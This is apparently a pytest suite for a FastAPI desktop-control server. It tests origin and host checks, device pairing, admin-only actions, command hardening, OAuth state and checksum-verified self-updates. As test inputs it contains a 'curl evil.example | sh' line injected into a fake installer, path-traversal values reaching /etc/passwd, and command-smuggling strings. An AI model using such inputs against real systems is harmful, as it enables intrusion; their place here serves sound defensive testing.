"""Host / Origin checks, pairing, roles and command hardening.

Every socket here runs on the TestClient's one event loop, like uvicorn's, so
an admin and a device can talk to each other through the server. The peer
address of each connection is set with _peer(); the paired-device store and
the pending requests are fresh per test, in tmp_path.
"""
import asyncio
import contextlib
import copy
import hashlib
import json
import os
import sys
import threading
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import pytest
from fastapi.testclient import TestClient
from starlette.websockets import WebSocketDisconnect

import security
import server
from server import _app
from test_integration import ADMIN_ORIGIN, BASE_URL, WS_URL, _receive_until, mock_hardware  # noqa: F401

LOOPBACK = ("127.0.0.1", 50000)
LAN_PEER = ("192.168.0.50", 50001)
APK_ORIGIN = {"origin": "file://"}
SECRETS = {
    "spot_secret": "spot-secret-value", "disc_secret": "disc-secret-value",
    "disc_token": "disc-token-value", "spot_token": "spot-token-value",
    "weather_api": "weather-key-value", "sounds_path": "/home/someone/private-sounds",
}


@pytest.fixture
def app(mock_hardware, tmp_path, monkeypatch):
    original = copy.deepcopy(server.config)
    monkeypatch.setattr(server, "paired_devices", security.PairedDevices(str(tmp_path / "paired_devices.json")))
    monkeypatch.setattr(server, "pairing", security.PairingRequests())
    monkeypatch.setattr(server, "pending_sockets", security.PendingSockets())
    monkeypatch.setattr(server, "global_sp_oauth", None)
    server._oauth_states.clear()
    with patch("server.save_config"), TestClient(_app, base_url=BASE_URL, client=LOOPBACK) as client:
        yield client
    server.config.clear()
    server.config.update(original)


@contextlib.contextmanager
def _peer(client, address):
    """Connections opened inside come from `address` (the transport reads it per request)."""
    previous = client._transport.client
    client._transport.client = address
    try:
        yield
    finally:
        client._transport.client = previous


@contextlib.contextmanager
def _admin(client):
    with client.websocket_connect(WS_URL, headers=ADMIN_ORIGIN) as ws:
        ws.send_json({"type": "auth"})
        assert ws.receive_json()["data"]["role"] == "admin"
        yield ws


@contextlib.contextmanager
def _device(client, token, origin=APK_ORIGIN):
    with _peer(client, LAN_PEER), client.websocket_connect(WS_URL, headers=origin) as ws:
        ws.send_json({"type": "auth", "token": token})
        assert ws.receive_json()["data"]["role"] == "device"
        yield ws


def _paired_token(name="Tablet"):
    _, token = server.paired_devices.add(name)
    return token


def _closed_with(ws) -> int:
    """Read until the server closes the socket; its close code."""
    with pytest.raises(WebSocketDisconnect) as closed:
        for _ in range(50):
            ws.receive_json()
    return closed.value.code


def _refusals(ws, count):
    return [_receive_until(ws, "refused")["data"] for _ in range(count)]


# ── 1. Host and Origin ─────────────────────────────────────────────────────────

def test_foreign_websocket_origin_is_closed_with_1008(app):
    for origin in ("http://evil.example", "null", "http://127.0.0.1:9999", "https://127.0.0.1:8888"):
        with pytest.raises(WebSocketDisconnect) as closed:
            with app.websocket_connect(WS_URL, headers={"origin": origin}):
                pass
        assert closed.value.code == 1008, origin


TABLET_UA = ("Mozilla/5.0 (Linux; Android 14; SM-X210 Build/UP1A.231005.007; wv) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Version/4.0 Chrome/141.0.7390.122 Safari/537.36")
DESKTOP_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
PHONE_CHROME_UA = ("Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.0.0 Mobile Safari/537.36")
APK_NULL = {"origin": "null", "user-agent": TABLET_UA}


def test_tablet_null_origin_is_accepted_only_from_a_lan_android_webview(app):
    # The Android app's file:// page sends "Origin: null" (seen from a real tablet).
    with _peer(app, LAN_PEER), app.websocket_connect(WS_URL, headers=APK_NULL) as ws:
        ws.send_json({"type": "auth", "token": ""})
        assert _closed_with(ws) == server.WS_CLOSE_UNAUTHORIZED      # reached the auth step
    with _device(app, _paired_token(), origin=APK_NULL):
        pass
    # Sandboxed iframes send "null" too: from a desktop or mobile browser, or from this PC, it is refused.
    refused = [(LAN_PEER, DESKTOP_UA), (LAN_PEER, PHONE_CHROME_UA), (LAN_PEER, ""), (LOOPBACK, TABLET_UA)]
    for peer, ua in refused:
        with pytest.raises(WebSocketDisconnect) as closed:
            with _peer(app, peer), app.websocket_connect(WS_URL, headers={"origin": "null", "user-agent": ua}):
                pass
        assert closed.value.code == 1008, (peer, ua)


def test_null_origin_tablet_is_never_admin(app):
    with _peer(app, LAN_PEER), app.websocket_connect(WS_URL, headers=APK_NULL) as ws:
        ws.send_json({"type": "auth"})
        assert _closed_with(ws) == server.WS_CLOSE_UNAUTHORIZED


def test_apk_origins_reach_the_auth_step(app):
    for origin in ("file://", "https://appassets.androidplatform.net"):
        with _peer(app, LAN_PEER), app.websocket_connect(WS_URL, headers={"origin": origin}) as ws:
            ws.send_json({"type": "auth", "token": ""})
            assert _closed_with(ws) == server.WS_CLOSE_UNAUTHORIZED


def test_bad_host_gets_403(app):
    for host in ("evil.example:8888", "127.0.0.1:9999", "localhost", "", "192.168.0.99:8888"):
        response = app.get("/", headers={"host": host})
        assert response.status_code == 403, host
        assert response.headers["x-frame-options"] == "DENY"
    with pytest.raises(WebSocketDisconnect) as closed:
        with app.websocket_connect("ws://evil.example:8888/ws", headers={"origin": "http://evil.example:8888"}):
            pass
    assert closed.value.code == 1008


def test_own_hosts_are_served(app):
    server.origin_policy.set_lan_ips(["192.168.0.10"])
    for host in ("127.0.0.1:8888", "localhost:8888", "LOCALHOST:8888", "192.168.0.10:8888"):
        assert app.get("/", headers={"host": host}).status_code == 200, host
    assert app.get("/static/themes.js", headers={"host": "192.168.0.10:8888"}).status_code == 200


def test_a_new_lan_address_is_picked_up_without_a_restart(app):
    server.origin_policy.set_lan_ips([])
    server.origin_policy._last_refresh = float("-inf")
    with patch.object(server.origin_policy, "_lan_ips_fn", lambda: ["10.0.0.7"]):
        assert app.get("/", headers={"host": "10.0.0.7:8888"}).status_code == 200
        # A name is never looked up again: rebinding uses names.
        assert app.get("/", headers={"host": "attacker.example:8888"}).status_code == 403


def test_no_wildcard_cors_and_no_preflight(app):
    response = app.options("/api/exit", headers={
        "origin": "http://evil.example", "access-control-request-method": "POST",
        "access-control-request-headers": "content-type"})
    assert response.status_code == 405
    assert "access-control-allow-origin" not in response.headers


# ── 2. Authentication and pairing ──────────────────────────────────────────────

def test_no_auth_within_five_seconds_closes_the_socket(app, monkeypatch):
    assert server.AUTH_TIMEOUT_S == 5.0
    monkeypatch.setattr(server, "AUTH_TIMEOUT_S", 0.2)
    with _peer(app, LAN_PEER), app.websocket_connect(WS_URL, headers=APK_ORIGIN) as ws:
        notice = ws.receive_json()
        # Old tablet apps only learn they must update; nothing about the PC.
        assert notice["type"] == "config_sync"
        assert notice["data"]["auth_required"] is True
        assert notice["data"]["cfg"] == {} and notice["data"]["hw"] == []
        assert set(notice["data"]) == {"auth_required", "cfg", "hw", "features", "req_apk_version", "update_apk_url"}
        assert _closed_with(ws) == 1008


def test_other_first_messages_close_the_socket(app):
    for first in ({"type": "set_volume", "data": {"type": "speaker", "val": 100}}, {"type": "auth_ok"}, "nonsense"):
        with _peer(app, LAN_PEER), app.websocket_connect(WS_URL, headers=APK_ORIGIN) as ws:
            ws.send_text(json.dumps(first))
            assert _closed_with(ws) == 1008


def test_invalid_or_revoked_token_is_rejected(app):
    token = _paired_token()
    for bad in ("", "x" * 43, token[:-1] + ("A" if token[-1] != "A" else "B"), None, 12345, "y" * 5000):
        with _peer(app, LAN_PEER), app.websocket_connect(WS_URL, headers=APK_ORIGIN) as ws:
            ws.send_json({"type": "auth", "token": bad})
            assert _closed_with(ws) == server.WS_CLOSE_UNAUTHORIZED, bad

    with _admin(app) as admin, _device(app, token) as device:
        device_id = server.paired_devices.public_list()[0]["id"]
        admin.send_json({"type": "revoke_device", "data": {"id": device_id}})
        assert _closed_with(device) == server.WS_CLOSE_UNAUTHORIZED   # the live socket goes at once
    with _peer(app, LAN_PEER), app.websocket_connect(WS_URL, headers=APK_ORIGIN) as ws:
        ws.send_json({"type": "auth", "token": token})
        assert _closed_with(ws) == server.WS_CLOSE_UNAUTHORIZED


def test_admin_needs_loopback_and_the_dashboard_origin(app):
    attempts = [
        (LAN_PEER, ADMIN_ORIGIN),                         # right origin, LAN address
        (LOOPBACK, {}),                                   # no Origin: a local script
        (LOOPBACK, APK_ORIGIN),
        (LOOPBACK, {"origin": "http://192.168.0.10:8888"}),
    ]
    server.origin_policy.set_lan_ips(["192.168.0.10"])
    for peer, headers in attempts:
        with _peer(app, peer), app.websocket_connect(WS_URL, headers=headers) as ws:
            ws.send_json({"type": "auth"})
            assert _closed_with(ws) == server.WS_CLOSE_UNAUTHORIZED, (peer, headers)
    with _peer(app, LOOPBACK), app.websocket_connect(WS_URL, headers={"origin": "http://localhost:8888"}) as ws:
        ws.send_json({"type": "auth"})
        assert ws.receive_json()["data"]["role"] == "admin"


def test_pairing_approved_on_the_pc_issues_a_working_token(app, tmp_path):
    with _admin(app) as admin:
        with _peer(app, LAN_PEER), app.websocket_connect(WS_URL, headers=APK_ORIGIN) as tablet:
            tablet.send_json({"type": "pair_request", "device_name": "Kitchen\x07 tablet\n" + "x" * 80})
            code = tablet.receive_json()
            assert code["type"] == "pair_code" and len(code["data"]["code"]) == 6
            assert code["data"]["code"].isdigit() and 0 < code["data"]["expires_in"] <= 60

            pending = _receive_until(admin, "pair_pending")["data"]
            assert pending["code"] == code["data"]["code"]
            assert pending["ip"] == LAN_PEER[0]
            assert pending["name"].startswith("Kitchen tablet x") and len(pending["name"]) == 40

            admin.send_json({"type": "pair_decision", "data": {"id": pending["id"], "allow": True}})
            result = tablet.receive_json()
            assert result["type"] == "pair_result" and result["data"]["status"] == "approved"
            token = result["data"]["token"]
            assert tablet.receive_json()["data"] == {"role": "device", "device_id": result["data"]["device_id"],
                                                     "name": pending["name"]}
            assert _receive_until(tablet, "config_sync")["data"]["cfg"]
            assert _receive_until(admin, "pair_resolved")["data"]["status"] == "approved"

    stored = (tmp_path / "paired_devices.json").read_text()
    assert token not in stored and security.hash_token(token) in stored
    (entry,) = json.loads(stored)
    assert set(entry) == {"id", "name", "token_hash", "created", "last_seen"}
    with _device(app, token):
        pass


def test_pairing_denied_or_expired_issues_nothing(app, monkeypatch):
    with _admin(app) as admin:
        with _peer(app, LAN_PEER), app.websocket_connect(WS_URL, headers=APK_ORIGIN) as tablet:
            tablet.send_json({"type": "pair_request", "device_name": "Tablet"})
            tablet.receive_json()
            pending = _receive_until(admin, "pair_pending")["data"]
            admin.send_json({"type": "pair_decision", "data": {"id": pending["id"], "allow": "yes"}})  # only True allows
            assert tablet.receive_json()["data"] == {"status": "denied"}
            assert _closed_with(tablet) == 1008

    monkeypatch.setattr(server, "pairing", security.PairingRequests(ttl=0.2))
    with _peer(app, LAN_PEER), app.websocket_connect(WS_URL, headers=APK_ORIGIN) as tablet:
        tablet.send_json({"type": "pair_request", "device_name": "Tablet"})
        tablet.receive_json()
        assert tablet.receive_json()["data"] == {"status": "expired"}
    assert server.paired_devices.public_list() == []


def test_pairing_limits():
    async def scenario():
        now = [0.0]
        requests = security.PairingRequests(clock=lambda: now[0])
        first = requests.open("10.0.0.1", "A")
        with pytest.raises(security.PairingRefused, match="busy"):
            requests.open("10.0.0.1", "A again")          # one pending per IP
        for i in range(2, 6):
            requests.open(f"10.0.0.{i}", "B")
        with pytest.raises(security.PairingRefused, match="rate_limited"):
            requests.open("10.0.0.9", "C")                # five per minute, across IPs
        now[0] = 61.0
        assert not requests.decide(first.id, True)        # expired: cannot be approved late
        for req in requests.pending():
            requests.close(req)
        requests.open("10.0.0.9", "C")                    # a minute later there is room again
    asyncio.run(scenario())


# ── 3. Roles ───────────────────────────────────────────────────────────────────

ADMIN_ONLY_MESSAGES = [
    {"type": "save_config", "data": {"spot_secret": "pwned"}},
    {"type": "save_macros", "data": [{"id": "x", "type": "app", "action_data": "xterm"}]},
    {"type": "set_theme", "data": {"id": "ember", "ground": "#000000"}},
    {"type": "set_play_key", "data": {"cover": False}},
    {"type": "req_local_sounds"},
    {"type": "req_apps_list"},
    {"type": "check_update"},
    {"type": "run_update"},
    {"type": "pair_decision", "data": {"id": "x", "allow": True}},
    {"type": "rename_device", "data": {"id": "x", "name": "y"}},
    {"type": "revoke_device", "data": {"id": "x"}},
    {"type": "action", "data": "disc_clear_auth"},
    {"type": "action", "data": "spot_clear_auth"},
    {"type": "action", "data": "disc_auth"},
]


def test_device_token_cannot_run_admin_actions(app):
    before = copy.deepcopy(server.config)
    with patch("server._start_update") as start_update, _device(app, _paired_token()) as ws:
        for msg in ADMIN_ONLY_MESSAGES:
            ws.send_json(msg)
        refusals = _refusals(ws, len(ADMIN_ONLY_MESSAGES))
    assert {r["reason"] for r in refusals} == {"admin_only"}
    assert server.config == before
    start_update.assert_not_called()


def test_admin_only_set_is_enforced_in_the_dispatcher():
    assert server.ADMIN_ACTIONS <= server.KNOWN_ACTIONS
    for msg in ADMIN_ONLY_MESSAGES:
        assert server._action_key(msg) in server.ADMIN_ACTIONS
    device = server.Client(ws=None, role="device", ip="192.168.0.50", device_id="d")
    admin = server.Client(ws=None, role="admin", ip="127.0.0.1")
    for key in server.ADMIN_ACTIONS:
        assert server._refusal(device, key) == "admin_only"
        assert server._refusal(admin, key) is None


def test_camera_and_screen_share_setting(app):
    server.config["device_av_controls"] = False
    with _device(app, _paired_token()) as ws:
        ws.send_json({"type": "action", "data": "disc_cam"})
        ws.send_json({"type": "action", "data": "disc_screen"})
        assert {r["reason"] for r in _refusals(ws, 2)} == {"disabled"}
    admin = server.Client(ws=None, role="admin", ip="127.0.0.1")
    assert server._refusal(admin, "action:disc_cam") is None


def test_forget_this_pc_removes_the_pairing(app, caplog):
    with _device(app, _paired_token()) as ws:
        ws.send_json({"type": "unpair_self"})
        assert _closed_with(ws) == 1000
    assert server.paired_devices.public_list() == []
    # The handler closed its own socket: the message loop ends, it does not read a closed socket.
    assert not [r for r in caplog.records if r.levelname == "ERROR" and r.name == "server"]


# ── 4. Command hardening ───────────────────────────────────────────────────────

def test_config_sent_to_a_device_has_no_secrets(app):
    server.config.update(SECRETS)
    server.config["macros"] = [
        {"id": "m1", "type": "app", "action_data": "/usr/bin/secret-tool --flag", "display_name": "T", "icon_url": ""},
        {"id": "m2", "type": "plugin", "action_data": "app_soundpad", "display_name": "SB", "icon_url": ""},
    ]
    server.config["local_buttons"] = [{"id": "private-clip-name.wav", "name": "Laugh", "uid": "p1"}]
    with _device(app, _paired_token()) as ws:
        sync = ws.receive_json()
    assert sync["type"] == "config_sync"
    raw = json.dumps(sync)
    for value in (*SECRETS.values(), "/usr/bin/secret-tool", "private-clip-name.wav"):
        assert value not in raw, value
    for key in ("update_notes", "update_available", "latest_version"):
        assert key not in sync["data"]
    cfg = sync["data"]["cfg"]
    assert cfg["macros"][0] == {"id": "m1", "type": "app", "display_name": "T", "icon_url": ""}
    assert cfg["macros"][1]["action_data"] == "app_soundpad"
    assert cfg["local_buttons"] == [{"uid": "p1", "name": "Laugh"}]

    with _admin(app) as admin:   # the PC's settings still see everything
        assert admin.receive_json()["data"]["cfg"]["spot_secret"] == SECRETS["spot_secret"]


def test_run_macro_runs_by_id_and_rejects_raw_commands(app):
    server.config["macros"] = [{"id": "m1", "type": "app", "action_data": "xterm", "display_name": "T"}]
    raw_attempts = [
        {"type": "run_macro", "id": "xterm -e sh"},
        {"type": "run_macro", "id": "/usr/bin/xterm"},
        {"type": "run_macro", "data": {"type": "app", "action_data": "xterm"}},
        {"type": "run_macro", "id": ["m1"]},
        {"type": "macro_exec", "data": {"type": "macro", "action_data": ["KEY_LEFTMETA", "KEY_R"]}},
        {"type": "action", "data": "app_term"},
        {"type": "action", "data": "local_play_../../etc/passwd"},
        {"type": "action", "data": "sp_play_1);DoExit("},
    ]
    with patch("server.AppEnumerator.launch_app") as launch, patch("server.MacroSystem.send_keys") as keys, \
            _device(app, _paired_token()) as ws:
        for msg in raw_attempts:
            ws.send_json(msg)
        refusals = _refusals(ws, len(raw_attempts))
        launch.assert_not_called()
        keys.assert_not_called()
        ws.send_json({"type": "run_macro", "id": "m1"})
        ws.send_json({"type": "nope"})          # handled in order: its refusal means m1 ran
        _refusals(ws, 1)
    assert [r["reason"] for r in refusals] == ["invalid"] * 4 + ["unknown"] * 4
    launch.assert_called_once_with("xterm")


def test_play_clip_resolves_inside_the_sounds_folder(app, tmp_path):
    sounds = tmp_path / "sounds"
    sounds.mkdir()
    (sounds / "laugh.wav").write_bytes(b"RIFF")
    (tmp_path / "outside.wav").write_bytes(b"RIFF")
    server.config.update(sounds_path=str(sounds), local_buttons=[
        {"id": "laugh.wav", "name": "Laugh", "uid": "p1"},
        {"id": "../outside.wav", "name": "Escape", "uid": "p2"},
        {"id": str(tmp_path / "outside.wav"), "name": "Absolute", "uid": "p3"},
    ])
    with patch("server.get_os_target", return_value="linux"), \
            patch("server.AudioSystem.play_local_sound") as play, _device(app, _paired_token()) as ws:
        for clip in ("p2", "p3", "laugh.wav", "../outside.wav"):
            ws.send_json({"type": "play_clip", "id": clip})
        assert {r["reason"] for r in _refusals(ws, 4)} == {"invalid"}
        ws.send_json({"type": "play_clip", "id": "p1"})
        ws.send_json({"type": "nope"})
        _refusals(ws, 1)
    play.assert_called_once_with(str((sounds / "laugh.wav").resolve()))


def test_soundpad_index_must_be_a_number():
    with pytest.raises(ValueError):
        asyncio.run(server._play_clip({"id": "1); DoExit("}, "soundpad"))


def test_ids_are_assigned_and_kept():
    items = [{"id": "keep-me"}, {"id": "keep-me"}, {"id": "has spaces"}, {}, "not-a-dict"]
    out = server._with_ids(items, "id")
    assert out[0]["id"] == "keep-me"
    assert len({i["id"] for i in out[:4]}) == 4
    assert all(server.ITEM_ID_RE.fullmatch(i["id"]) for i in out[:4])
    assert out[4] == "not-a-dict"


# ── HTTP routes ────────────────────────────────────────────────────────────────

def _control(token):
    return {"content-type": "application/json", "authorization": f"Bearer {token}"}


def test_local_control_routes_need_loopback_json_and_the_token(app):
    token = security.read_local_token(server.DATA_DIR)
    assert token
    with patch("server._desktop_module.wakeup") as wakeup:
        assert app.post("/api/wakeup", json={}, headers=_control(token)).status_code == 200
        wakeup.assert_called_once()
        assert app.post("/api/wakeup", json={}, headers=_control("wrong")).status_code == 401
        assert app.post("/api/wakeup", json={}).status_code == 401
        assert app.post("/api/wakeup", content="{}", headers={
            "content-type": "text/plain", "authorization": f"Bearer {token}"}).status_code == 415
        assert app.get("/api/wakeup").status_code == 405
        with _peer(app, LAN_PEER):
            assert app.post("/api/wakeup", json={}, headers=_control(token)).status_code == 403
        wakeup.assert_called_once()

    timers = []
    with patch("threading.Timer", side_effect=lambda *a: timers.append(a) or threading.Event()):
        assert app.post("/api/exit", content="", headers={"authorization": f"Bearer {token}"}).status_code == 415
        assert timers == []


def test_oauth_routes_are_loopback_only(app):
    with _peer(app, LAN_PEER):
        for path in ("/callback?code=x", "/disc_callback?code=x", "/spotify_login"):
            assert app.get(path, follow_redirects=False).status_code == 403, path
    assert app.get("/callback", follow_redirects=False).status_code == 307


def test_update_routes_are_gone_from_http(app):
    assert app.get("/api/check_update").status_code == 404
    assert app.post("/api/update").status_code in (404, 405)


def test_local_art_needs_a_url_signed_for_the_current_cover(app, tmp_path):
    cover = tmp_path / "cover.png"
    cover.write_bytes(b"\x89PNG")
    with patch("server.media_module.get_last_mpris_art_path", return_value=str(cover)):
        signed = server._signed_media({"art_url": "/api/local_art?h=abc"})["art_url"]
        assert app.get("/api/local_art?h=abc").status_code == 404
        assert app.get("/api/local_art?h=abc&k=" + "0" * 32).status_code == 404

        ok = app.get(signed, headers={"origin": "file://"})
        assert ok.status_code == 200
        assert ok.headers["access-control-allow-origin"] == "file://"
        evil = app.get(signed, headers={"origin": "http://evil.example"})
        assert evil.status_code == 200 and "access-control-allow-origin" not in evil.headers
        with _peer(app, LAN_PEER):   # the tablet reads the cover's pixels for its tint
            assert app.get(signed, headers=APK_NULL).headers["access-control-allow-origin"] == "null"
            browser = app.get(signed, headers={"origin": "null", "user-agent": DESKTOP_UA})
            assert "access-control-allow-origin" not in browser.headers

        server._signed_media({"art_url": "/api/local_art?h=next-track"})
        assert app.get(signed).status_code == 404   # an old URL stops working
        server._signed_media({"art_url": "https://i.scdn.co/image/x"})
        assert app.get(signed).status_code == 404


# ── Store ──────────────────────────────────────────────────────────────────────

def test_store_survives_a_corrupt_file_and_writes_privately(tmp_path):
    path = tmp_path / "paired_devices.json"
    path.write_text("{not json")
    store = security.PairedDevices(str(path))
    assert store.public_list() == []
    entry, token = store.add("Tablet")
    if sys.platform != "win32":
        assert path.stat().st_mode & 0o777 == 0o600
    assert store.verify(token)["id"] == entry["id"]
    assert security.PairedDevices(str(path)).verify(token)["id"] == entry["id"]   # reloads from disk
    assert store.rename(entry["id"], "  New\tname ") and store.get(entry["id"])["name"] == "New name"
    assert store.revoke(entry["id"]) and store.verify(token) is None


# ── OAuth state ────────────────────────────────────────────────────────────────

def _query(url):
    from urllib.parse import parse_qs, urlparse
    return {k: v[0] for k, v in parse_qs(urlparse(url).query).items()}


def test_spotify_sign_in_needs_the_state_it_was_started_with(app):
    server.config.update(spot_id="client-id", spot_secret="client-secret")
    with patch.object(server.SpotifyOAuth, "get_access_token") as exchange:
        state = _query(app.get("/spotify_login", follow_redirects=False).headers["location"])["state"]
        assert len(state) >= 32
        for bad in ("", "wrong", state + "x"):
            assert app.get(f"/callback?code=c&state={bad}", follow_redirects=False).status_code == 400
        assert app.get("/callback?code=c", follow_redirects=False).status_code == 400
        exchange.assert_not_called()
        # A wrong guess does not cancel the real sign-in; the real one works once.
        assert app.get(f"/callback?code=c&state={state}", follow_redirects=False).status_code == 307
        exchange.assert_called_once_with("c")
        assert app.get(f"/callback?code=c&state={state}", follow_redirects=False).status_code == 400


def test_discord_sign_in_needs_its_state(app):
    server.config.update(disc_id="123", disc_secret="secret", disc_token="")
    ipc = MagicMock(connected=False, auth_pending=True, voice_supported=False, vesktop_ipc_warning=False)
    ipc.exchange_code.return_value = True
    with patch("server.disc_ipc_instance", ipc):
        url = server._discord_state()["auth_url"]
        state = _query(url)["state"]
        assert server._discord_auth_url() == url   # stable until used, so sys_data does not churn
        assert app.get("/disc_callback?code=c&state=forged", follow_redirects=False).status_code == 400
        ipc.exchange_code.assert_not_called()
        assert app.get(f"/disc_callback?code=c&state={state}", follow_redirects=False).status_code == 307
        ipc.exchange_code.assert_called_once_with("c")
        assert _query(server._discord_auth_url())["state"] != state


def test_devices_never_see_the_discord_sign_in_url(app):
    server.config.update(disc_id="123", disc_secret="secret", disc_token="")
    with _admin(app) as admin, _device(app, _paired_token()) as device:
        assert "state=" in _receive_until(admin, "sys_data")["data"]["discord"]["auth_url"]
        assert "auth_url" not in _receive_until(device, "sys_data")["data"]["discord"]


# ── WebSocket limits ───────────────────────────────────────────────────────────

def test_unauthenticated_sockets_are_capped(app, monkeypatch):
    monkeypatch.setattr(server, "pending_sockets", security.PendingSockets(total=8, per_ip=1))
    token = _paired_token()
    with _peer(app, LAN_PEER), app.websocket_connect(WS_URL, headers=APK_ORIGIN) as waiting:
        with pytest.raises(WebSocketDisconnect) as closed:
            with app.websocket_connect(WS_URL, headers=APK_ORIGIN):
                pass
        assert closed.value.code == server.WS_CLOSE_TRY_LATER
        waiting.send_json({"type": "auth", "token": token})
        assert waiting.receive_json()["type"] == "auth_ok"
        # Authenticated: its slot is free again.
        with app.websocket_connect(WS_URL, headers=APK_ORIGIN) as again:
            again.send_json({"type": "auth", "token": token})
            assert again.receive_json()["type"] == "auth_ok"


def test_pending_socket_slots():
    slots = security.PendingSockets(total=3, per_ip=2)
    assert slots.acquire("a") and slots.acquire("a") and not slots.acquire("a")
    assert slots.acquire("b") and not slots.acquire("c")      # total reached
    slots.release("a")
    assert slots.acquire("c")


def test_uvicorn_caps_websocket_message_size(monkeypatch):
    seen = {}

    class FakeServer:
        def __init__(self, cfg):
            seen["cfg"] = cfg

        def run(self):
            pass

    monkeypatch.setenv("TD_PORT", "8888")
    monkeypatch.setattr(server, "uvicorn_server", None)
    monkeypatch.setattr(server.uvicorn, "Server", FakeServer)
    server.run_fastapi_server(port=8888)
    assert seen["cfg"].ws_max_size == server.WS_MAX_MESSAGE_BYTES == 1 << 20


# ── Content Security Policy ────────────────────────────────────────────────────

def test_content_security_policy(app):
    server.origin_policy.set_lan_ips(["192.168.0.10"])
    with _peer(app, LAN_PEER):
        lan = app.get("/", headers={"host": "192.168.0.10:8888"}).headers["content-security-policy"]
    for directive in ("connect-src 'self' ws://192.168.0.10:8888;", "object-src 'none'", "base-uri 'none'",
                      "form-action 'none'", "frame-ancestors 'none'", "script-src 'self' 'unsafe-inline';"):
        assert directive in lan, directive
    assert "unsafe-eval" not in lan and "wss:" not in lan and " ws: " not in lan

    # The desktop window (loopback) keeps 'unsafe-eval' for pywebview's JS bridge.
    local = app.get("/").headers["content-security-policy"]
    assert "'unsafe-eval'" in local and "ws://127.0.0.1:8888" in local

    refused = app.get("/", headers={"host": "evil.example:8888"})
    assert refused.status_code == 403
    assert "evil.example" not in refused.headers["content-security-policy"]


# ── Self-update: only what was released ────────────────────────────────────────

def test_sha256sums_parsing():
    digest = "a" * 64
    assert server._sha256sums(f"{digest}  setup.sh\n{digest.upper()} *install.ps1\ngarbage\n") == {
        "setup.sh": digest, "install.ps1": digest}


def test_update_installer_must_match_the_release_checksum(monkeypatch):
    body = b"#!/bin/bash\necho update\n"
    files = {"SHA256SUMS": f"{hashlib.sha256(body).hexdigest()}  setup.sh\n".encode(), "setup.sh": body}
    urls = []

    def fake_download(url, limit):
        urls.append(url)
        return files[url.rsplit("/", 1)[1]]

    monkeypatch.setattr(server, "_download", fake_download)
    monkeypatch.setattr(server, "get_os_target", lambda: "linux")
    path = server._fetch_verified_installer("v0.11.0")
    try:
        assert Path(path).read_bytes() == body
    finally:
        os.unlink(path)
    assert all(u.startswith(f"{server.RELEASE_DOWNLOAD_URL}/v0.11.0/") for u in urls)

    files["setup.sh"] = body + b"curl evil.example | sh\n"
    with pytest.raises(ValueError, match="SHA256SUMS"):
        server._fetch_verified_installer("v0.11.0")
    files["SHA256SUMS"] = b""
    with pytest.raises(ValueError):
        server._fetch_verified_installer("v0.11.0")
    urls.clear()
    for tag in ("main", "v0.11.0/../../evil", "v1"):
        with pytest.raises(ValueError, match="not a release tag"):
            server._fetch_verified_installer(tag)
    assert urls == []


def test_update_runs_the_installer_without_a_shell(monkeypatch, tmp_path):
    installer = tmp_path / "setup.sh"
    installer.write_text("")
    calls = {}

    async def fake_exec(*argv, **kwargs):
        calls["argv"], calls["env"] = argv, kwargs["env"]
        raise OSError("stop before running anything")

    monkeypatch.setattr(server, "_fetch_verified_installer", lambda tag: str(installer))
    monkeypatch.setattr(server.asyncio, "create_subprocess_exec", fake_exec)
    monkeypatch.setattr(server, "get_os_target", lambda: "linux")
    monkeypatch.setattr(server, "_update_running", False)

    async def scenario():
        assert server._start_update("v0.11.0")
        assert not server._start_update("v0.11.0")     # one at a time
        for _ in range(50):
            await asyncio.sleep(0.01)
            if calls and not server._update_running:
                break
    asyncio.run(scenario())
    assert calls["argv"] == ("bash", str(installer))
    assert calls["env"]["TD_RELEASE_TAG"] == "v0.11.0" and calls["env"]["AUTO_UPDATE"] == "1"
    assert not installer.exists()                     # removed after the failed run
    assert server._update_running is False


def test_run_update_needs_a_published_update(app, monkeypatch):
    monkeypatch.setattr(server, "update_available", False)
    with patch("server._start_update") as start, _admin(app) as admin:
        admin.send_json({"type": "run_update"})
        assert _receive_until(admin, "refused")["data"] == {"action": "run_update", "reason": "no_update"}
    start.assert_not_called()
